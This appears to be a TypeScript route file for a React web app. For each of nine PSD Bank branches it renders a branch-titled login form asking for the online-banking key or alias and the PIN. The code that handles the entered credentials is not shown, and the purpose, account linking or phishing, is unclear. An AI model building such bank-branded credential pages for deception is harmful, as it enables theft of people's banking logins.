import { createFileRoute, notFound } from "@tanstack/react-router";
import { BankLoginPage } from "@/components/BankLoginPage";

export const branches = [
  "PSD Bank Braunschweig",
  "PSD Bank Hannover eG",
  "PSD Bank Karlsruhe-Neustadt",
  "PSD Bank München",
  "PSD Bank Nord eG",
  "PSD Bank Nürnberg eG",
  "PSD Bank Rhein-Ruhr",
  "PSD Bank RheinNeckarSaar eG",
  "PSD Bank West eG",
];

export function slugifyPsd(name: string): string {
  return name
    .toLowerCase()
    .replace(/ä/g, "ae").replace(/ö/g, "oe").replace(/ü/g, "ue").replace(/ß/g, "ss")
    .replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
}

const bySlug: Record<string, string> = Object.fromEntries(
  branches.map((n) => [slugifyPsd(n), n])
);

export const Route = createFileRoute("/bank/psd/$slug")({
  component: PsdBranchLogin,
});

function PsdBranchLogin() {
  const { slug } = Route.useParams();
  const name = bySlug[slug];
  if (!name) throw notFound();
  return (
    <BankLoginPage
      idPrefix={`psd-${slug}`}
      logoSlug="psd-banken"
      title={name}
      field1Label="PSD-Key oder Alias"
      field2Label="PIN"
      field2Tooltip="Online-Banking PIN, nicht die 4-stellige PIN Ihrer EC-/Maestro-Karte"
      backTo="/bank/psd"
    />
  );
}
